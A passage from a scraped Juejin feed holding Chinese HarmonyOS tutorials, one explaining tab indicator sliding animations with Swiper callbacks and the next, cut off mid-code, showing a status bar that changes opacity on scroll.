<p>在页签点击事件中触发页签切换事件，后续就会触发tab的onChange事件实现切换动画。</p>
<p>// 页签点击事件
ListItem() {
// 布局实现
}
.onClick(() =&gt; {
this.listTouchState = 1;
this.tabController.changeIndex(index);
})</p>
</li>
</ul>
<h4 data-id="heading-8">2.滑动Tab的切换</h4>
<p>滑动页签切换主要分为两个部分：一个是背景条的滑动，一个是页签条的滑动。</p>
<p>2.1 手势跟踪</p>
<pre><code class="hljs language-ini" lang="ini">Swiper(this.swiperController) {
  // 布局实现
}
.onGestureSwipe((index: number, event: TabsAnimationEvent) =&gt; {
  <span class="hljs-attr">this.listTouchState</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
  let curOffset: <span class="hljs-attr">number</span> = event.current<span class="hljs-literal">Off</span>set<span class="hljs-comment">;</span>
  let targetIndex: <span class="hljs-attr">number</span> = index<span class="hljs-comment">;</span>
  <span class="hljs-attr">this.isReachBorder</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
  // tab组件到达边界使背景条和页签条跳转到终点位置
  // TODO: 知识点: 这里不能判断到边界直接退出，因为onGestureSwipe每一帧触发回调，当手势滑动较快，上一帧背景条没有到达边界
  // TODO(接上): 知识点: 下一帧content超出边界，这时候背景条没有更新，退出将导致背景条停滞在上一帧位置无法更新。
  if ((<span class="hljs-attr">index</span> === <span class="hljs-number">0</span> &amp;&amp; cur<span class="hljs-literal">Off</span>set &gt; <span class="hljs-number">0</span>) ||
    (<span class="hljs-attr">index</span> === this.innerBarData.length - <span class="hljs-number">1</span> &amp;&amp; cur<span class="hljs-literal">Off</span>set &lt; <span class="hljs-number">0</span>)) {
    <span class="hljs-attr">this.isReachBorder</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
    <span class="hljs-attr">curOffset</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
  }

  let ratio: <span class="hljs-attr">number</span> = Math.abs(cur<span class="hljs-literal">Off</span>set / this.tabsWidth)<span class="hljs-comment">; // tab滑动比例</span>
  if (curOffset &lt; 0) { // tab右滑
    <span class="hljs-attr">targetIndex</span> = index + <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  } else if (curOffset &gt; 0) { // tab左滑
    <span class="hljs-attr">targetIndex</span> = index - <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  }
  // 获取背景条位置及页签条偏移
  // 获取背景条位置及页签条偏移
  this.gestureAnimation(index, targetIndex, this.elementsInfo, ratio)<span class="hljs-comment">;</span>
})

/**
 * 手势滑动动效
 * @param index - 起始页签索引
 * @param targetIndex - 目标页签索引
 * @param elementsInfo - 页签信息<span class="hljs-section">[背景条左端位置, 页签条偏移]</span>
 * @param ratio - 当前手势滑动比例
 * @returns
 */
gestureAnimation: (index: number, targetIndex: number, elementsInfo: IndicatorAnimationInfo<span class="hljs-section">[]</span>, ratio: number) =&gt; <span class="hljs-attr">void</span> =
  (index: number, targetIndex: number, elementsInfo: IndicatorAnimationInfo<span class="hljs-section">[]</span>, ratio: number): <span class="hljs-attr">void</span> =&gt; {
    <span class="hljs-attr">this.animationAttribute.left</span> = elementsInfo[index].left + (elementsInfo[targetIndex].left - elementsInfo[index].left) * ratio<span class="hljs-comment">;</span>
    this.scroller!.scrollTo({xOffset: elementsInfo<span class="hljs-section">[index]</span>.offset + (elementsInfo<span class="hljs-section">[targetIndex]</span>.offset - elementsInfo<span class="hljs-section">[index]</span>.offset) * ratio, yOffset: 0})<span class="hljs-comment">;</span>
    let indicatorSize: <span class="hljs-section">[number, number]</span> = this.getIndicatorSize(ratio, index, targetIndex)<span class="hljs-comment">;</span>
    <span class="hljs-attr">this.animationAttribute.indicatorBarWidth</span> = indicatorSize[<span class="hljs-number">0</span>]<span class="hljs-comment">;</span>
    <span class="hljs-attr">this.animationAttribute.indicatorBarHeight</span> = indicatorSize[<span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
  }<span class="hljs-comment">;</span>
</code></pre>
<p>具体思路： 手势跟踪滑动主要存在两种情况：1）背景条到达边界；2）背景条未到达边界。首先判断tab是否滑动到边界，若滑动到边界，则目标页签等于当前页签。否则，则根据当前的偏移情况来判断目标页签相对于当前页签的位置。然后，分别获取当前页签以及目标页签对应的背景条位置以及页签条偏移作为背景条和页签条的起始状态和最终状态。之后，可以通过计算tab滑动比例，获取当前背景条位置以及页签条偏移，公式如下所示：</p>
<p><img src="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/753/188/655/0030086000753188655.20241112155448.15165570652993497711761492221015:50001231000000:2800:22461A880326840156127BDF00A3EC7A1E6E8F58EC696730938CEA9FF99BB61B.jpg" alt="" loading="lazy"/></p>
<p>2.2 动画效果</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title class_">Swiper</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">swiperController</span>) {
  <span class="hljs-comment">// 布局实现</span>
}
.<span class="hljs-title function_">onContentDidScroll</span>(<span class="hljs-function">(<span class="hljs-params">selectedIndex: <span class="hljs-built_in">number</span>, index: <span class="hljs-built_in">number</span>, position: <span class="hljs-built_in">number</span>, mainAxisLength: <span class="hljs-built_in">number</span></span>) =&gt;</span> {
  <span class="hljs-comment">// 动画启动，选取当前index索引页签的属性来执行背景条和页签条滑动</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isAnimationStart</span> &amp;&amp; index === <span class="hljs-variable language_">this</span>.<span class="hljs-property">innerCurrnetIndex</span>) {
    <span class="hljs-comment">// 使用选中页签相对于Swiper主轴起始位置的移动比例判断滑动的目标页签targetIndex的位置</span>
    <span class="hljs-keyword">let</span> <span class="hljs-attr">targetIndex</span>: <span class="hljs-built_in">number</span> = position &lt; <span class="hljs-number">0</span> ? index + <span class="hljs-number">1</span> : index - <span class="hljs-number">1</span>;
    <span class="hljs-keyword">if</span> (targetIndex &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">innerBarData</span>.<span class="hljs-property">length</span> || targetIndex &lt; <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`Error: targetIndex exceeds the limit range:
            selectedIndex: <span class="hljs-subst">${selectedIndex}</span>, curIndex: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.innerCurrnetIndex}</span>, index: <span class="hljs-subst">${index}</span>,
            targetIndex: <span class="hljs-subst">${targetIndex}</span>, position: <span class="hljs-subst">${position}</span>, mainAxisLength: <span class="hljs-subst">${mainAxisLength}</span>`</span>);
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">let</span> <span class="hljs-attr">ratio</span>: <span class="hljs-built_in">number</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(position);
    <span class="hljs-comment">// 通过页签比例计算当前页签条和背景条的位置</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">autoAnimation</span>(index, targetIndex, <span class="hljs-variable language_">this</span>.<span class="hljs-property">elementsInfo</span>, ratio);
  }
})
.<span class="hljs-title function_">onAnimationStart</span>(<span class="hljs-function">(<span class="hljs-params">index: <span class="hljs-built_in">number</span>, targetIndex: <span class="hljs-built_in">number</span>, event: TabsAnimationEvent</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isReachBorder</span>) { <span class="hljs-comment">// 若tab到达边界，则不继续执行动画</span>
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-variable language_">this</span>.<span class="hljs-property">isAnimationStart</span> = <span class="hljs-literal">true</span>;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">listTouchState</span> = <span class="hljs-number">0</span>;
})
.<span class="hljs-title function_">onAnimationEnd</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">isAnimationStart</span> = <span class="hljs-literal">false</span>;
})

<span class="hljs-comment">/**
 * 自动滑动动效
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">index</span> - 起始页签索引
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">targetIndex</span> - 目标页签索引
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">elementsInfo</span> - 页签动效信息[背景条左端位置, 页签条偏移]
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">ratio</span> - 当前tab滑动比例
 * <span class="hljs-doctag">@returns</span>
 */</span>
<span class="hljs-attr">autoAnimation</span>: <span class="hljs-function">(<span class="hljs-params">index: <span class="hljs-built_in">number</span>, targetIndex: <span class="hljs-built_in">number</span>, elementsInfo: IndicatorAnimationInfo[], ratio: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">void</span> =
  (<span class="hljs-attr">index</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">targetIndex</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">elementsInfo</span>: <span class="hljs-title class_">IndicatorAnimationInfo</span>[], <span class="hljs-attr">ratio</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">animationAttribute</span>.<span class="hljs-property">left</span> = elementsInfo[index].<span class="hljs-property">left</span> + (elementsInfo[targetIndex].<span class="hljs-property">left</span> - elementsInfo[index].<span class="hljs-property">left</span>) * ratio;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">scroller</span>!.<span class="hljs-title function_">scrollTo</span>({
      <span class="hljs-attr">xOffset</span>: elementsInfo[index].<span class="hljs-property">offset</span> + (elementsInfo[targetIndex].<span class="hljs-property">offset</span> - elementsInfo[index].<span class="hljs-property">offset</span>) * ratio,
      <span class="hljs-attr">yOffset</span>: <span class="hljs-number">0</span>
    });
    <span class="hljs-keyword">let</span> <span class="hljs-attr">indicatorSize</span>: [<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>] = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getIndicatorSize</span>(ratio, index, targetIndex);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">animationAttribute</span>.<span class="hljs-property">indicatorBarWidth</span> = indicatorSize[<span class="hljs-number">0</span>];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">animationAttribute</span>.<span class="hljs-property">indicatorBarHeight</span> = indicatorSize[<span class="hljs-number">1</span>];
  };
</code></pre>
<p>具体思路：首先在动画开始时，我们在onAnimationStart回调中只进行动画开始状态的改变(i.e. this.isAnimationStart = true)。然后，在onContentDidScroll回调中进行绘制动画。具体来说，在每一次回调onContentDidScroll接口时通过起始页签index、目标页签targetIndex以及滑动比例来判断当前背景条位置以及页签条的偏移，如公式(1)所示。 因此，动画函数中最重要的就是判断index、targetIndex以及滑动比例。由于页签条的滑动等价于背景条滑动，因此我们只需要判断背景条的滑动情况就可以覆盖所有情况。如下图所示，这里主要存在以下三种情况的判断：1）背景条未回弹且滑动比例小于0.5；2）背景条未回弹且滑动比例大于等于0.5；3）背景条回弹。</p>
<ul>
<li>背景条未回弹且滑动比例小于0.5。这时候起始页签index应该等于curIndex，而目标页签targetIndex则可以根据滑动比例正负判断index+1(index-1)。当tab不断向左(右)滑动时，index页签滑动比例不断增加，背景条也不断向右(左)滑动。 <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3693165cd984404295011fb4de0ffe27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767623716&amp;x-signature=4xHk9CWH7Tar50Zlm05Zj4G4PEg%3D" alt="" loading="lazy"/></li>
<li>背景条回弹。这时候起始页签应该等于curIndex，而目标页签targetIndex则可以根据滑动比例正负判断index+1(index-1)。当tab回弹时，index页签滑动比例不断减少，背景条也不断向左(右)滑动，直至回弹到原位置。 <img src="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/753/188/655/0030086000753188655.20241112155556.18668753938282901278375408321859:50001231000000:2800:7048F42A46AF7BA65E56C5ABE532B5457FE4FCB49ED8DF1ED2A078A30E01F14C.jpg" alt="" loading="lazy"/></li>
<li>背景条未回弹且滑动比例大于等于0.5。这时候目标页签应该等于curIndex，起始页签index应该则可以根据滑动比例正负判断targetIndex+1(targetIndex-1)。但是，仔细观察我们可以发现，其实这种情况与背景条回弹情况基本一致。可以将其看作是黄色页签开始向左滑动，也可以将其看作是绿色页签开始进行回弹。因此，我们可以将其转化为绿色页签回弹，如后续第二张图所示。这时候起始页签应该等于curIndex，而目标页签targetIndex则可以根据滑动比例正负判断index+1(index-1)。当index页签内容回弹时，tab滑动比例不断减少，背景条也不断向右(左)滑动，直至回弹到原位置。 <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74b6b5751fb34eed9b495448648ee49c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767623716&amp;x-signature=fXRxHGZUbA2DDY2lUJOEZiAYKoU%3D" alt="" loading="lazy"/> <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fc86ebc4f774132b3f365384c596d6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767623716&amp;x-signature=F54KlZY3mB%2BnS%2B5tp7ThVDe9sL4%3D" alt="" loading="lazy"/></li>
</ul>
<h3 data-id="heading-9">总结</h3>
<p>本示例使用了<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references-V5%2Fts-rendering-control-lazyforeach-V5" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references-V5/ts-rendering-control-lazyforeach-V5" ref="nofollow noopener noreferrer">LazyForEach</a>进行数据懒加载，LazyForEach懒加载可以通过设置cachedCount属性来指定缓存数量，同时搭配<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fbest-practices-V5%2Fbpta-component-reuse-V5" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/best-practices-V5/bpta-component-reuse-V5" ref="nofollow noopener noreferrer">组件复用</a>能力以达到性能最优效果。</p>
<h4 data-id="heading-10">如果您想系统深入地学习 HarmonyOS 开发或想考取HarmonyOS认证证书，欢迎加入华为开发者学堂：</h4>
<h3 data-id="heading-11">请点击→： <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2Fd0d15d9039414a8fad9f99ac4a3f5096%3Ftype%3D1%253Fha_source%253Dhmosclass%26ha_sourceId%3D89000248" target="_blank" title="https://developer.huawei.com/consumer/cn/training/classDetail/d0d15d9039414a8fad9f99ac4a3f5096?type=1%3Fha_source%3Dhmosclass&amp;ha_sourceId=89000248" ref="nofollow noopener noreferrer">HarmonyOS官方认证培训</a></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74a7ba13e43043c8b42062f8c1f2df5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767623716&amp;x-signature=Rjwce9Q%2FlqrthiP0BhulqN1mazE%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HarmonyOS应用开发：状态栏动画实现]]></title>    <link>https://juejin.cn/post/7589172193150386212</link>    <guid>https://juejin.cn/post/7589172193150386212</guid>    <pubDate>2025-12-29T14:38:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589172193150386212" data-draft-id="7589172193150369828" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HarmonyOS应用开发：状态栏动画实现"/> <meta itemprop="keywords" content="HarmonyOS,程序员,Android"/> <meta itemprop="datePublished" content="2025-12-29T14:38:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鹿人戛"/> <meta itemprop="url" content="https://juejin.cn/user/4309685005226376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HarmonyOS应用开发：状态栏动画实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4309685005226376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鹿人戛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:38:18.000Z" title="Mon Dec 29 2025 14:38:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>本案例展示了状态栏的动态交互效果。通过监听页面滚动事件 <code>onDidScroll</code>，随着页面的上下滚动，实现状态栏颜色的变化。搜索框会在滚动时流畅地展开或收起，并伴有自然的透明度过渡效果。</p>
<h3 data-id="heading-1">效果图预览</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3064042edec1412ea719171e33071a4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767623898&amp;x-signature=KyMi6HGBLfyLqFqwm1pqVlnuTjQ%3D" alt="" loading="lazy"/></p>
<p><strong>使用说明</strong></p>
<ol>
<li>进入页面开始加载，加载完成后显示整个界面,上下滚动页面即可。</li>
</ol>
<h3 data-id="heading-2">实现思路</h3>
<ul>
<li>
<p><strong>初始化和状态设置</strong><br/>
在 <code>aboutToAppear()</code> 方法中，初始化了窗口模型 <code>windowModel</code>。启用沉浸式（设置全屏显示和状态栏为白色），获取状态栏高度存储在 <code>statusBarHeight</code> 变量中，从预定义的数据源 <code>LIST_DATA</code> 加载数据到 <code>dataSource</code>中。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">aboutToAppear(): void {
  <span class="hljs-comment">// 初始化窗口管理model</span>
  <span class="hljs-keyword">const</span> windowStage: window.WindowStage | undefined = AppStorage.<span class="hljs-keyword">get</span>(<span class="hljs-string">'windowStage'</span>);
  <span class="hljs-comment">// 没有windowStage将无法执行下列逻辑</span>
  <span class="hljs-keyword">if</span> (!windowStage) {
    logger.error(TAG, <span class="hljs-string">'windowStage init error!'</span>);
    <span class="hljs-keyword">return</span>;
  }
  <span class="hljs-keyword">this</span>.windowModel.setWindowStage(windowStage);
  <span class="hljs-comment">// 设置沉浸模式及状态栏白色</span>
  <span class="hljs-keyword">this</span>.windowModel.setImmersive();
  <span class="hljs-comment">// 获取顶部状态栏高度</span>
  <span class="hljs-keyword">this</span>.windowModel.getStatusBarHeight((statusBarHeight) =&gt; {
    logger.info(TAG, <span class="hljs-string">'statusBarHeight is '</span> + statusBarHeight);
    <span class="hljs-keyword">this</span>.statusBarHeight = px2vp(statusBarHeight);
  })
  <span class="hljs-comment">// 组装数据源</span>
  <span class="hljs-keyword">this</span>.dataSource.pushArrayData(LIST_DATA)
}
</code></pre>
</li>
<li>
<p><strong>界面布局构造</strong><br/>
使用Stack控件使状态栏与列表重叠，并为列表添加滚动监听器，以根据滚动位置调整状态栏和导航栏的透明度及展开收起动效。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">Stack</span>({ alignContent: Alignment.Top }) {
  <span class="hljs-built_in">Row</span>() {
    <span class="hljs-comment">// 动态显示回顶部或位置天气控件</span>
    if (this.isFlow) {
      this<span class="hljs-selector-class">.topUpBuilder</span>()
    } else {
      this<span class="hljs-selector-class">.locationAndWeatherBuilder</span>()
    }
    this<span class="hljs-selector-class">.searchViewBuilder</span>()
    this<span class="hljs-selector-class">.toolViewBuilder</span>()
  }
  <span class="hljs-selector-class">.height</span>(Constants.NAVIGATION_BAR_HEIGHT + this.statusBarHeight)
    <span class="hljs-selector-class">.width</span>(Constants.FULL_PERCENT)
    <span class="hljs-selector-class">.padding</span>({
      top: this.statusBarHeight
    })
    <span class="hljs-selector-class">.zIndex</span>(Constants.Z_INDEX_THREE)

  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 知识点：父组件的透明度Opacity影响子组件（如父类Opacity为0.5，若子组件为0.5时，子组件实际Opacity = 0.5*0.5）,此处Row来改变状态栏的透明度不受影响其它组件透明度</span>
  <span class="hljs-built_in">Row</span>() {
  }
  <span class="hljs-selector-class">.backgroundColor</span>($r("app.color.status_bar_animation_white"))
    <span class="hljs-selector-class">.opacity</span>(this.navigateBarOpacity)
    <span class="hljs-selector-class">.height</span>(Constants.STATUS_BAR_HEIGHT + this.statusBarHeight)
    <span class="hljs-selector-class">.width</span>(Constants.FULL_PERCENT)
    <span class="hljs-selector-class">.zIndex</span>(Constants.Z_INDEX_TWO)

  <span class="hljs-built_in">List</span>({ scroller: this.scroller }) {
    <span class="hljs-comment">// ...</span>
  }
  <span class="hljs-comment">// 隐藏滚动条</span>
  <span class="hljs-selector-class">.scrollBar</span>(BarState.Off)
    <span class="hljs-comment">// 渐变蓝色背景色</span>
    <span class="hljs-selector-class">.linearGradient</span>({
      colors: [[Constants.LIST_LINEAR_GRADIENT_START_COLOR, Constants.LIST_LINEAR_GRADIENT_START],
        [Constants.LIST_LINEAR_GRADIENT_END_COLOR, Constants.LIST_LINEAR_GRADIENT_END]]
    })
    <span class="hljs-selector-class">.height</span>(Constants.FULL_PERCENT)
    <span class="hljs-selector-class">.width</span>(Constants.FULL_PERCENT)
}
<span class="hljs-selector-class">.zIndex</span>(Constants.Z_INDEX_ONE)
  <span class="hljs-selector-class">.height</span>(Constants.FULL_PERCENT)
  <span class="hljs-selector-class">.width</span>(Constants.FULL_PERCENT)
    <span class="hljs-comment">// 扩展至所有非安全区域</span>
  <span class="hljs-selector-class">.expandSafeArea</span>([SafeAreaType.SYSTEM], [SafeAreaEdge.BOTTOM])
</code></pre>
</li>
<li>
<p><strong>滚动事件处理</strong><br/>
通过监听页面滚动事件 <code>onDidScroll</code>，根据当前的滚动偏移量 yOffset 调整状态栏和导航栏的透明度。如果滚动超过了设定的阈值，则改变状态栏的颜色和展开收起动画。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">.onDidScroll(() =&gt; {
  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 知识点：通过currentOffset来获取偏移量比较准确。</span>
  <span class="hljs-keyword">const</span> yOffset: number = <span class="hljs-keyword">this</span>.scroller.currentOffset().yOffset;
  yOffset &lt;= Constants.MAIN_SCROLLER_OFFSET_Y_ZERO ? <span class="hljs-keyword">this</span>.negativeOffsetY = yOffset :
  Constants.MAIN_SCROLLER_OFFSET_Y_ZERO;
  <span class="hljs-comment">// 判断导航栏和状态栏背景透明度变化</span>
  yOffset &gt;= Constants.MAIN_SCROLLER_OFFSET_Y_MAX + <span class="hljs-keyword">this</span>.statusBarHeight ?
    <span class="hljs-keyword">this</span>.navigateBarOpacity = Constants.NAVIGATION_BAR_OPACITY_MAX :
    <span class="hljs-keyword">this</span>.navigateBarOpacity = Constants.NAVIGATION_BAR_OPACITY_MIN;
  <span class="hljs-keyword">this</span>.navigateBarOpacity = yOffset / Constants.MAIN_SCROLLER_OFFSET_Y_MAX;
  <span class="hljs-comment">// 判断当前的导航栏和图标颜色变化</span>
  yOffset &gt; <span class="hljs-keyword">this</span>.statusBarHeight ?
